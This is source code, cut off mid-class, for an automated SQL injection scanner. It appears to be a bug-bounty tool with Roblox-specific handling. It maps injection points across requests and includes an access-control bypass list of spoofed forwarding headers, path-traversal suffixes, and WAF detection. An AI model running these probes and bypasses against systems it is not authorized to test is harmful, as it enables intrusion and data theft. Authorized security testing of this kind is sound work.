#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  HUGINN :: sqli.py — v6.1
#  SQL Injection Scanner — detection-corrected, AI-triaged.
# -----------------------------------------------------------------------------
#  What's new in v6.1:
#    · UNION detection is marker-based (no more path-segment false positives)
#    · Garbage-control baseline — skips IPs that react to any value change
#    · 403/401 bypass only counts 2xx/3xx as success (404s no longer fake)
#    · Smoke test — 3 quick probes per IP; skips dead endpoints entirely
#    · Header injection reduced to 8 by default; --header-set for presets
#    · Path injection restricted to ID-like segments by default
#    · --safe preset (no method-fuzz, no headers, no paths)
#    · Default max-payloads-per-IP lowered to 50
#    · Brain startup hint when AI is OFF
#    · Findings carry full evidence chain for reproduction
# =============================================================================

import re
import time
import json
import shlex
import hashlib
import secrets
import statistics
import threading
from pathlib import Path
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin, quote, unquote)
from concurrent.futures import ThreadPoolExecutor, as_completed

from huginn_utils import (
    log, section, load_json, save_json, load_payloads, send_request,
    safe_filename, format_duration, C, now_iso,
)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from huginn_utils import HeaderJar, mask_header_value
    _HEADER_JAR_AVAILABLE = True
except ImportError:
    _HEADER_JAR_AVAILABLE = False
    HeaderJar = None
    mask_header_value = None

try:
    from huginn_utils import get_roblox_csrf_token, reset_roblox_csrf
    _ROBLOX_CSRF_AVAILABLE = True
except ImportError:
    _ROBLOX_CSRF_AVAILABLE = False
    def get_roblox_csrf_token(*a, **kw): return None
    def reset_roblox_csrf(*a, **kw): return None

try:
    from brain import get_brain
    _BRAIN_AVAILABLE = True
except Exception:
    _BRAIN_AVAILABLE = False
    get_brain = None


# =============================================================================
#  CONSTANTS
# =============================================================================
DESTRUCTIVE_TAGS = {"destructive", "rce", "file-write", "stacked"}
AUTH_EXPIRY_THRESHOLD = 0.7
ROBLOX_HOST_MARKERS = ("roblox.com", "rbxcdn.com", "robloxlabs.com")

PAYLOAD_PRIORITY = {
    "error_based":      1,
    "basic_detection":  2,
    "union_based":      3,
    "blind_boolean":    4,
    "auth_bypass":      5,
    "blind_time":       6,
    "dbms_specific":    7,
    "waf_bypass":       8,
    "stacked_queries":  9,
    "cloud_specific":   10,
    "legacy":           11,
    "nosql":            12,
    "modern_bypass":    13,
    "ai_generated":     0,
}

# Path segments that look like IDs get tested; routes are skipped
_ID_LIKE_RE = re.compile(
    r"^(?:\d{1,12}"
    r"|[a-f0-9]{8,64}"
    r"|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
    r"|\d+[-_]\d+)$",
    re.I,
)

# --- Header injection presets ---
HEADER_SETS = {
    "minimal": [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-HTTP-Method-Override",
        "X-Real-IP",
        "X-Originating-IP",
        "True-Client-IP",
    ],
    "standard": [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
        "X-Forwarded-Prefix", "X-Original-URL", "X-Rewrite-URL",
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Real-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "X-Cluster-Client-IP", "True-Client-IP",
        "CF-Connecting-IP", "Fastly-Client-IP", "Client-IP",
        "Forwarded-For", "Forwarded",
    ],
    "aggressive": [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
        "X-Forwarded-Prefix", "X-Original-URL", "X-Rewrite-URL",
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Real-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "X-Cluster-Client-IP", "True-Client-IP",
        "CF-Connecting-IP", "Fastly-Client-IP", "Client-IP",
        "Forwarded-For", "Forwarded",
        "X-User-Id", "X-Account-Id", "X-Tenant-Id", "X-Org-Id",
        "X-Organization-Id", "X-Workspace-Id", "X-Api-Version",
        "X-Original-Host", "X-Host", "X-Backend-Server",
        "Referer", "Origin", "Accept", "Accept-Language",
        "Content-Type", "X-Requested-With", "X-Custom-IP-Authorization",
    ],
}
INJECTABLE_HEADERS = HEADER_SETS["minimal"]  # default


# =============================================================================
#  403 BYPASS LADDER  (unchanged header list, but see _try_bypass_ladder)
# =============================================================================
BYPASS_ATTEMPTS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method-Override": "POST"},
    {"X-HTTP-Method-Override": "PUT"},
    {"Referer": "https://localhost/"},
    {"Referer": "https://127.0.0.1/"},
    {
        "X-Forwarded-For": "127.0.0.1",
        "X-Original-URL": "/",
        "X-Rewrite-URL": "/",
    },
]

BYPASS_PATH_SUFFIXES = [
    "/",
    "/.",
    "//",
    "/./",
    "/%2e/",
    "/%2e",
    "/..",
    "/../",
    "/%20/",
    "/%09/",
    "/%00",
    "?",
    "#",
    "/;",
    "/..;/",
]


# =============================================================================
#  DBMS ERROR SIGNATURES  (unchanged)
# =============================================================================
ERROR_SIGNATURES = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
        r"MySqlClient\.", r"com\.mysql\.jdbc",
        r"Zend_Db_Adapter_Mysqli_Exception",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"You have an error in your SQL syntax",
        r"MySqlException", r"MySQLSyntaxErrorException",
        r"mysqli_", r"MariaDB server version",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR: parser: parse error at or near",
        r"pg_query\(\)", r"pg_exec\(\)",
        r"unterminated quoted string at or near",
    ],
    "mssql": [
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"macromedia\.jdbc\.sqlserver",
        r"com\.jnetdirect\.jsql",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"System\.Data\.SqlClient\.SqlException",
        r"mssql_query\(\)",
    ],
    "oracle": [
        r"\bORA-[0-9]{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_", r"Warning.*\Wora_", r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"ORA-00933", r"ORA-01756", r"ORA-00911",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]", r"SQLite error \d+:",
        r"sqlite3\.OperationalError:", r"sqlite3\.ProgrammingError:",
        r"SQLite3::SQLException", r"org\.sqlite\.JDBC",
    ],
    "sybase": [
        r"Sybase message", r"Sybase.*Server message",
        r"SybSQLException", r"com\.sybase\.jdbc",
    ],
    "db2": [r"DB2 SQL error", r"CLI Driver.*DB2", r"com\.ibm\.db2"],
    "informix": [
        r"Informix ODBC Driver", r"com\.informix\.jdbc",
        r"ODBC Informix driver",
    ],
    "ingres": [r"Ingres SQLSTATE", r"Ingres\W.*Driver"],
    "access": [
        r"JET Database Engine", r"Access Database Engine",
        r"Microsoft Access Driver", r"Syntax error.*in query expression",
    ],
    "generic": [
        r"SQL command not properly ended", r"syntax error at or near",
        r"Unclosed quotation mark", r"Unterminated string literal",
        r"invalid query", r"Dynamic SQL Error",
        r"Syntax error in string in query expression",
    ],
}

ALL_SIGNATURES = [(dbms, re.compile(sig, re.I))
                  for dbms, sigs in ERROR_SIGNATURES.items()
                  for sig in sigs]

GENERIC_500_HINTS = re.compile(
    r"(sql|query|database|odbc|jdbc|driver|syntax|column|table)", re.I
)

TIME_PAYLOADS = re.compile(
    r"(sleep\s*\(|pg_sleep\s*\(|waitfor\s+delay|benchmark\s*\(|"
    r"dbms_lock\.sleep\s*\()",
    re.I,
)

UNION_PAYLOADS = re.compile(r"\bunion\b.*\bselect\b", re.I)


# =============================================================================
#  WAF signatures (unchanged)
# =============================================================================
WAF_BLOCK_SIGNATURES = {
    "cloudflare": [r"cloudflare", r"cf-error-details",
                   r"Attention Required.*Cloudflare", r"Ray ID",
                   r"Error 1020", r"Error 1015"],
    "akamai":     [r"akamai", r"Reference\s*#\d+",
                   r"Access Denied.*Akamai"],
    "incapsula":  [r"incap_ses", r"incapsula",
                   r"Request unsuccessful.*Incapsula"],
    "imperva":    [r"imperva", r"_Incapsula_Resource"],
    "sucuri":     [r"sucuri", r"Sucuri WebSite Firewall"],
    "modsecurity":[r"mod_security", r"ModSecurity", r"Not Acceptable!"],
    "f5":         [r"F5 Networks", r"BIG-IP", r"TS[a-f0-9]{8}"],
    "awswaf":     [r"AWS WAF", r"awselb", r"Request blocked"],
    "barracuda":  [r"Barracuda", r"Barra_counter_session"],
    "fortiweb":   [r"FortiWeb", r"FORTIWAFSID"],
    "wordfence":  [r"Wordfence", r"Generated by Wordfence"],
    "generic_block": [r"Request Rejected", r"Blocked by",
                      r"Access Denied.*Firewall"],
}


def _detect_waf_signature(body, headers):
    haystack = (body or "")[:8000]
    for k, v in (headers or {}).items():
        haystack += "\n{}: {}".format(k, v)

    for name, sigs in WAF_BLOCK_SIGNATURES.items():
        for sig in sigs:
            try:
                if re.search(sig, haystack, re.I):
                    return name
            except Exception:
                continue

    server = (headers or {}).get("server", "").lower() if headers else ""
    for name in ("cloudflare", "sucuri", "incapsula", "akamai", "imperva"):
        if name in server:
            return name
    return None


def classify_status(resp):
    if resp is None:
        return {"code": "EMPTY", "interesting": False, "waf_name": None,
                "retry_after": None, "notes": "no response"}

    status = resp.status_code
    try:
        body = (resp.text or "")[:8000]
    except Exception:
        body = ""
    headers = {k.lower(): v for k, v in dict(resp.headers or {}).items()}
    waf_name = _detect_waf_signature(body, headers)

    retry_after = None
    ra = headers.get("retry-after")
    if ra:
        try:
            retry_after = float(ra)
        except Exception:
            retry_after = None

    if 200 <= status < 300:
        return {"code": "OK", "interesting": True, "waf_name": waf_name,
                "retry_after": retry_after, "notes": ""}
    if 300 <= status < 400:
        return {"code": "REDIRECT", "interesting": True,
                "waf_name": waf_name, "retry_after": retry_after,
                "notes": "Location: {}".format(headers.get("location", "")[:120])}
    if status == 304:
        return {"code": "NOT_MODIFIED", "interesting": False,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if status == 400:
        return {"code": "BAD_REQUEST", "interesting": True,
                "waf_name": waf_name, "retry_after": retry_after,
                "notes": "parser break"}
    if status == 401:
        return {"code": "AUTH_REQUIRED", "interesting": True,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if status == 403:
        if waf_name:
            return {"code": "FORBIDDEN_WAF", "interesting": False,
                    "waf_name": waf_name, "retry_after": retry_after,
                    "notes": "WAF block"}
        return {"code": "FORBIDDEN_ACL", "interesting": False,
                "waf_name": None, "retry_after": retry_after,
                "notes": "ACL denial"}
    if status == 404:
        return {"code": "NOT_FOUND", "interesting": False,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if status == 405:
        return {"code": "METHOD_NOT_ALLOWED", "interesting": False,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if status == 406:
        return {"code": "NOT_ACCEPTABLE", "interesting": False,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if status == 429:
        return {"code": "RATE_LIMITED", "interesting": False,
                "waf_name": waf_name,
                "retry_after": retry_after if retry_after else 5.0,
                "notes": "rate limited"}
    if status == 501:
        return {"code": "NOT_IMPLEMENTED", "interesting": True,
                "waf_name": waf_name, "retry_after": retry_after, "notes": ""}
    if 500 <= status < 600:
        interesting = (status == 500)
        return {"code": "SERVER_ERROR", "interesting": interesting,
                "waf_name": waf_name, "retry_after": retry_after,
                "notes": "status {}".format(status)}
    return {"code": "UNKNOWN", "interesting": False, "waf_name": waf_name,
            "retry_after": retry_after, "notes": "status {}".format(status)}


SEVERITY_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}


# =============================================================================
#  SKIP FILTERS
# =============================================================================
SKIP_EXTENSIONS = {
    ".js", ".mjs", ".css", ".map",
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".bmp",
    ".woff", ".woff2", ".ttf", ".otf", ".eot",
    ".mp3", ".mp4", ".webm", ".wav", ".ogg", ".ogv",
    ".pdf", ".zip", ".tar", ".gz", ".7z", ".rar",
    ".exe", ".dll", ".so", ".bin",
}

CDN_HOST_MARKERS = (
    "cdn.", ".cdn.", "static.", "assets.", "img.", "images.",
    "fonts.", "rbxcdn", "akamaihd", "cloudfront", "cloudflare",
    "fastly", "jsdelivr", "gstatic",
)


def _url_extension(url):
    path = urlparse(url).path
    if "." not in path.rsplit("/", 1)[-1]:
        return ""
    return "." + path.rsplit(".", 1)[-1].lower()


def _is_static_url(url):
    if _url_extension(url) in SKIP_EXTENSIONS:
        return True
    host = urlparse(url).netloc.lower()
    for marker in CDN_HOST_MARKERS:
        if marker in host:
            return True
    return False


def _is_roblox_host(url_or_host):
    h = (url_or_host or "").lower()
    return any(m in h for m in ROBLOX_HOST_MARKERS)


def _is_id_like_segment(seg):
    """True if a path segment looks like a real ID (numeric, hex, UUID)."""
    if not seg or len(seg) > 64:
        return False
    return bool(_ID_LIKE_RE.match(seg))


def _fingerprint_response(resp):
    if resp is None:
        return {"hash": None, "length": 0, "status": None, "ctype": None}

    try:
        body = resp.text or ""
    except Exception:
        body = ""

    stable = re.sub(r"\b[a-f0-9]{24,}\b", "__HEX__", body)
    stable = re.sub(r"\b[A-Za-z0-9+/=]{40,}\b", "__B64__", stable)

    try:
        ctype = (resp.headers.get("Content-Type") or "").split(";")[0].strip()
    except Exception:
        ctype = ""

    try:
        status = resp.status_code
    except Exception:
        status = None

    return {
        "hash": hashlib.sha256(
            "{}|{}".format(stable, ctype).encode("utf-8", errors="ignore")
        ).hexdigest()[:16],
        "length": len(body),
        "status": status,
        "ctype": ctype,
    }


def _fingerprints_differ(a, b, min_len_delta=200):
    if a["hash"] is None or b["hash"] is None:
        return False
    if a["hash"] == b["hash"]:
        return False
    if a.get("status") != b.get("status"):
        return True
    if abs(a["length"] - b["length"]) >= min_len_delta:
        return True
    if a["hash"] != b["hash"] and abs(a["length"] - b["length"]) > 20:
        return True
    return False


def _boolean_opposite(payload):
    if not payload:
        return None
    if "1=1" in payload:
        return payload.replace("1=1", "1=2")
    if "1=2" in payload:
        return payload.replace("1=2", "1=1")
    if "'a'='a'" in payload:
        return payload.replace("'a'='a'", "'a'='b'")
    if "'a'='b'" in payload:
        return payload.replace("'a'='b'", "'a'='a'")
    m = re.search(r"=\s*(\d{1,4})\b", payload)
    if m and ("ASCII" in payload.upper() or "SUBSTRING" in payload.upper()):
        val = int(m.group(1))
        return payload[:m.start(1)] + str(val ^ 1) + payload[m.end(1):]
    return None


def _payload_text_hash(payload_text):
    return hashlib.md5((payload_text or "").encode("utf-8",
                                                     errors="ignore")).hexdigest()[:12]


def _payload_reflected(resp, payload):
    if resp is None or not payload or len(payload) < 4:
        return False
    try:
        return payload in (resp.text or "")
    except Exception:
        return False


def _random_marker():
    """Unique marker unlikely to appear in any real response."""
    return "huginn{}x".format(secrets.token_hex(6))


# =============================================================================
#  INJECTION POINT MODEL
# =============================================================================
class InjectionPoint:
    __slots__ = ("url", "method", "location", "name", "value",
                 "json_path", "extra_headers", "form_data", "json_body",
                 "content_type", "baseline_resp", "baseline_fp",
                 "control_resp", "control_fp",
                 "timing_baseline", "timing_stddev", "stable",
                 "payloads_tested", "found_high_confidence",
                 "is_header_value", "needs_csrf", "worth_testing")

    def __init__(self, url, method, location, name, value,
                 json_path=None, extra_headers=None,
                 form_data=None, json_body=None, content_type=None,
                 is_header_value=False, needs_csrf=False):
        self.url = url
        self.method = method
        self.location = location
        self.name = name
        self.value = value
        self.json_path = json_path
        self.extra_headers = extra_headers or {}
        self.form_data = form_data or {}
        self.json_body = json_body
        self.content_type = content_type
        self.baseline_resp = None
        self.baseline_fp = None
        self.control_resp = None      # NEW: response to a garbage value
        self.control_fp = None
        self.timing_baseline = None
        self.timing_stddev = None
        self.stable = True
        self.payloads_tested = 0
        self.found_high_confidence = False
        self.is_header_value = is_header_value
        self.needs_csrf = needs_csrf
        self.worth_testing = True     # NEW: set False if smoke test fails

    def key(self):
        return (self.url, self.method, self.location, self.name)

    def __repr__(self):
        return "<IP {}:{} @ {} {}>".format(self.location, self.name,
                                            self.method, self.url)


# =============================================================================
#  INJECTION POINT EXTRACTION
# =============================================================================
def _extract_query_params(page):
    url = page["url"]
    parsed = urlparse(url)
    if not parsed.query:
        return []
    qs = parse_qs(parsed.query, keep_blank_values=True)
    return [InjectionPoint(url, "GET", "query", k, v[0])
            for k, v in qs.items()]


def _extract_path_segments(page, mode="id_like"):
    """
    mode:
      "id_like"  — only segments that look like real IDs (default)
      "all"      — every non-static segment (aggressive, very FP-prone)
      "off"      — disable entirely
    """
    if mode == "off":
        return []
    parsed = urlparse(page["url"])
    segs = [s for s in parsed.path.split("/") if s]
    if not segs:
        return []
    out = []
    for i, seg in enumerate(segs):
        if _is_static_url("http://x/{}".format(seg)):
            continue
        if mode == "id_like" and not _is_id_like_segment(seg):
            continue
        out.append(InjectionPoint(
            page["url"], "GET", "path", "segment[{}]".format(i), seg,
            extra_headers={"_segment_index": str(i)},
        ))
    return out


def _extract_forms(page):
    if BeautifulSoup is None:
        return []
    html = page.get("content") or ""
    if not html:
        return []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return []
    points = []
    for form in soup.find_all("form"):
        action = form.get("action") or page["url"]
        action_url = urljoin(page["url"], action)
        method = (form.get("method") or "GET").upper()
        ct = (form.get("enctype") or
              "application/x-www-form-urlencoded").lower()
        data = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "").lower()
            if itype in ("submit", "button", "reset", "file", "image"):
                continue
            data[name] = inp.get("value") or ""
        for name, value in data.items():
            points.append(InjectionPoint(
                action_url, method, "body_form", name, value,
                form_data=dict(data), content_type=ct,
            ))
    return points


def _extract_headers(page, enabled_headers):
    """
    Extract:
      A) header NAME injection (rare)
      B) header VALUE injection (common)
    Uses the `enabled_headers` list passed in.
    """
    points = []

    for h in enabled_headers:
        points.append(InjectionPoint(
            page["url"], "GET", "header", h, "",
            is_header_value=False,
        ))

    req_headers = page.get("headers") or {}
    value_headers = ["Referer", "Origin", "User-Agent",
                     "Accept", "Accept-Language", "X-Requested-With"]
    for h in value_headers:
        existing = req_headers.get(h, "")
        points.append(InjectionPoint(
            page["url"], "GET", "header_value", h, existing,
            is_header_value=True,
        ))

    return points


def _extract_cookies(page):
    headers = page.get("headers") or {}
    sc = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
    if not sc:
        return []
    out = []
    for chunk in sc.split(","):
        m = re.match(r"\s*([^=]+)=([^;]+)", chunk)
        if m:
            out.append(InjectionPoint(
                page["url"], "GET", "cookie",
                m.group(1).strip(), m.group(2).strip(),
            ))
    return out


def _extract_json_body(page):
    ct = (page.get("content_type") or "").lower()
    content = page.get("content") or ""
    if "json" not in ct and not content.lstrip().startswith(("{", "[")):
        return []
    try:
        body = json.loads(content)
    except Exception:
        return []
    points = []

    def walk(obj, path="$"):
        if isinstance(obj, dict):
            for k, v in obj.items():
                walk(v, "{}.{}".format(path, k))
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                walk(v, "{}[{}]".format(path, i))
        else:
            points.append(InjectionPoint(
                page["url"], "POST", "body_json", path, str(obj),
                json_path=path, json_body=body,
                content_type="application/json",
            ))

    walk(body)
    return points


def _extract_multipart(page):
    ct = (page.get("content_type") or "").lower()
    content = page.get("content") or ""
    if "multipart/form-data" not in ct or not content:
        return []

    m = re.search(r'boundary=([^;]+)', ct)
    if not m:
        return []
    boundary = m.group(1).strip().strip('"')
    if not boundary:
        return []

    parts = content.split("--" + boundary)
    fields = []
    for part in parts:
        if not part.strip() or part.strip() == "--":
            continue
        if "\r\n\r\n" in part:
            headers_part, _, body_part = part.partition("\r\n\r\n")
        elif "\n\n" in part:
            headers_part, _, body_part = part.partition("\n\n")
        else:
            continue

        nm = re.search(r'name="([^"]+)"', headers_part)
        if not nm:
            continue
        field_name = nm.group(1)
        value = body_part.strip().rstrip("--").strip()

        if "filename=" in headers_part:
            continue
        fields.append((field_name, value))

    if not fields:
        return []
    form_data = dict(fields)
    points = []
    for name, value in fields:
        points.append(InjectionPoint(
            page["url"], "POST", "body_multipart", name, value,
            form_data=dict(form_data),
            content_type=page.get("content_type") or "multipart/form-data",
        ))
    return points


def _extract_method_variants(page, enable=True):
    if not enable:
        return []
    url = page["url"]
    parsed = urlparse(url)
    if not parsed.query:
        return []
    qs = parse_qs(parsed.query, keep_blank_values=True)
    points = []
    for method in ("POST", "PUT", "PATCH", "DELETE"):
        for k, v in qs.items():
            points.append(InjectionPoint(
                url, method, "query", k, v[0],
                extra_headers={"_method_variant": method},
            ))
    return points


def extract_injection_points(pages, method_fuzz=False,
                              path_mode="id_like",
                              enabled_headers=None):
    if enabled_headers is None:
        enabled_headers = INJECTABLE_HEADERS

    points, seen = [], set()
    for page in pages:
        url = page.get("url", "")
        if _is_static_url(url):
            continue

        cands = []
        cands.extend(_extract_query_params(page))
        cands.extend(_extract_path_segments(page, mode=path_mode))
        cands.extend(_extract_forms(page))
        cands.extend(_extract_headers(page, enabled_headers))
        cands.extend(_extract_cookies(page))
        cands.extend(_extract_json_body(page))
        cands.extend(_extract_multipart(page))
        cands.extend(_extract_method_variants(page, enable=method_fuzz))

        for ip in cands:
            k = ip.key()
            if k in seen:
                continue
            seen.add(k)
            points.append(ip)
    return points


# =============================================================================
#  REQUEST BUILDER
# =============================================================================
def _set_json_path(obj, path, value):
    tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
    cur = obj
    for i, (name, idx) in enumerate(tokens):
        key = name if name else int(idx)
        if i == len(tokens) - 1:
            cur[key] = value
            return
        cur = cur[key]


def _multipart_encode(fields, boundary):
    out = []
    for name, value in fields.items():
        out.append("--" + boundary)
        out.append('Content-Disposition: form-data; name="{}"'.format(name))
        out.append("")
        out.append(str(value))
    out.append("--" + boundary + "--")
    out.append("")
    return "\r\n".join(out).encode("utf-8")


def build_request(ip, payload, timeout=12, extra_headers=None,
                  allow_redirects=False, override_method=None,
                  url_suffix=None):
    headers = dict(ip.extra_headers)
    if extra_headers:
        headers.update(extra_headers)

    url = ip.url
    method = override_method or ip.method
    data = None

    if ip.location == "query":
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))

    elif ip.location == "path":
        idx = int(headers.pop("_segment_index", "0"))
        p = urlparse(url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))

    elif ip.location == "body_form":
        body = dict(ip.form_data)
        body[ip.name] = payload
        data = body
        headers["Content-Type"] = (ip.content_type or
                                    "application/x-www-form-urlencoded")
        if method == "GET":
            method = "POST"

    elif ip.location == "body_multipart":
        body = dict(ip.form_data)
        body[ip.name] = payload
        boundary = "----HUGINN{}".format(_payload_text_hash(payload))
        try:
            data = _multipart_encode(body, boundary)
            headers["Content-Type"] = "multipart/form-data; boundary={}".format(
                boundary)
        except Exception:
            return None
        if method == "GET":
            method = "POST"

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        data = json.dumps(body)
        headers["Content-Type"] = "application/json"
        if method == "GET":
            method = "POST"

    elif ip.location == "cookie":
        existing = headers.get("Cookie", "")
        pair = "{}={}".format(ip.name, payload)
        headers["Cookie"] = ("{}; {}".format(existing, pair).strip("; ")
                             if existing else pair)

    elif ip.location == "header":
        headers[ip.name] = payload

    elif ip.location == "header_value":
        headers[ip.name] = payload

    if url_suffix:
        url = url.rstrip("/") + url_suffix

    headers.pop("_method_variant", None)

    return send_request(
        url, method=method, headers=headers,
        timeout=timeout, allow_redirects=allow_redirects, data=data,
    )


def build_curl(ip, payload, timeout=15, session_headers=None,
               override_method=None):
    parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]

    if session_headers:
        for k, v in session_headers.items():
            low = k.lower()
            if low in ("cookie", "authorization", "x-api-key",
                       "x-auth-token", "x-csrf-token"):
                parts.extend(["-H", shlex.quote("{}: {}".format(k, v))])

    method = override_method or ip.method
    if method != "GET":
        parts.extend(["-X", method])

    if ip.location == "query":
        p = urlparse(ip.url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
        parts.append(shlex.quote(url))

    elif ip.location == "path":
        idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
        p = urlparse(ip.url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))
        parts.append(shlex.quote(url))

    elif ip.location in ("body_form", "body_multipart"):
        body = dict(ip.form_data)
        body[ip.name] = payload
        if ip.location == "body_multipart":
            boundary = "----HUGINN{}".format(_payload_text_hash(payload))
            parts.extend(["-H", shlex.quote(
                "Content-Type: multipart/form-data; boundary=" + boundary)])
            for k, v in body.items():
                parts.extend(["-F", shlex.quote("{}={}".format(k, v))])
        else:
            for k, v in body.items():
                parts.extend(["--data-urlencode",
                              shlex.quote("{}={}".format(k, v))])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        parts.extend(["-H", shlex.quote("Content-Type: application/json")])
        parts.extend(["--data-raw", shlex.quote(json.dumps(body))])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "cookie":
        parts.extend(["-H",
                      shlex.quote("Cookie: {}={}".format(ip.name, payload))])
        parts.append(shlex.quote(ip.url))

    elif ip.location in ("header", "header_value"):
        parts.extend(["-H", shlex.quote("{}: {}".format(ip.name, payload))])
        parts.append(shlex.quote(ip.url))

    else:
        parts.append(shlex.quote(ip.url))

    return " ".join(parts)


# =============================================================================
#  DETECTION PRIMITIVES
# =============================================================================
def _match_error_signature(body, baseline_body=""):
    if not body:
        return None, None
    baseline_low = baseline_body.lower() if baseline_body else ""
    for dbms, regex in ALL_SIGNATURES:
        m = regex.search(body)
        if m:
            matched = m.group(0)[:120].lower()
            if matched in baseline_low:
                continue
            start = max(0, m.start() - 80)
            end = min(len(body), m.end() + 200)
            return dbms, body[start:end]
    return None, None


def _severity_for(confidence):
    return {"high": "high", "medium": "medium",
            "low": "low"}.get(confidence, "low")


# =============================================================================
#  SCANNER
# =============================================================================
class SQLiScanner:

    def __init__(self,
                 program_dir,
                 sites_root=None,
                 max_workers=6,
                 delay=0.15,
                 timeout=12,
                 waf_hint=None,
                 dbms_hint=None,
                 time_threshold=4.0,
                 confirm_timing=True,
                 cookie=None,
                 user_agent=None,
                 min_severity="medium",
                 use_ai=True,
                 ai_severity=True,
                 headers_dir=None,
                 cli_headers=None,
                 no_auth=False,
                 max_payloads_per_ip=50,
                 allow_destructive=False,
                 confirm_medium=True,
                 method_fuzz=False,
                 bypass_403=True,
                 roblox_csrf=True,
                 header_set="minimal",
                 path_mode="id_like",
                 smoke_test=True):
        self.program_dir = Path(program_dir)
        self.sites_root = Path(sites_root or (self.program_dir / "sites"))
        self.findings_root = self.program_dir / "findings" / "sqli"
        self.findings_root.mkdir(parents=True, exist_ok=True)

        self.max_workers = max_workers
        self.delay = delay
        self.timeout = timeout
        self.waf_hint = waf_hint
        self.dbms_hint = dbms_hint
        self.time_threshold = time_threshold
        self.confirm_timing = confirm_timing
        self.min_severity = (min_severity or "low").lower()
        self.use_ai = use_ai
        self.ai_severity_enabled = ai_severity
        self.max_payloads_per_ip = int(max_payloads_per_ip or 0)
        self.allow_destructive = allow_destructive
        self.confirm_medium = confirm_medium
        self.method_fuzz = method_fuzz
        self.bypass_403_enabled = bypass_403
        self.roblox_csrf_enabled = roblox_csrf
        self.smoke_test_enabled = smoke_test
        self.header_set = header_set
        self.path_mode = path_mode
        self.enabled_headers = HEADER_SETS.get(header_set,
                                                HEADER_SETS["minimal"])

        # --- HeaderJar ---
        self.header_jar = None
        self.no_auth = no_auth
        if not no_auth and _HEADER_JAR_AVAILABLE:
            hdir = (Path(headers_dir) if headers_dir
                    else (self.program_dir / "headers"))
            try:
